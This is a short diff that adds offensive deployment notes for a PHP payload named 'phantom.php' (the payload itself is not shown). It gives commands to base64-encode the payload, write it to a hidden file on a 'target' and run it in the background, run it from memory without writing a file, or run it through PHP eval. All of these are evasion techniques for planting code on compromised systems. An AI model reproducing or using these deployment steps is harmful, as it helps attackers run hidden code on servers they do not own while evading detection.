@@ -1,0 +1,14 @@
+# Base64 Deployment
+# Generate: cat phantom.php | base64 -w0
+
+# Deploy on target:
+echo 'BASE64_ENCODED_CONTENT' | base64 -d > /tmp/.cache.php && php /tmp/.cache.php &
+
+# Memory-only execution (no file written):
+echo 'BASE64_ENCODED_CONTENT' | base64 -d | php
+
+# Via PHP eval:
+php -r 'eval(base64_decode("BASE64_ENCODED_CONTENT"));'
+
+# Generate the base64:
+# cat phantom.php | base64 -w0 > payloads/phantom_b64.txt
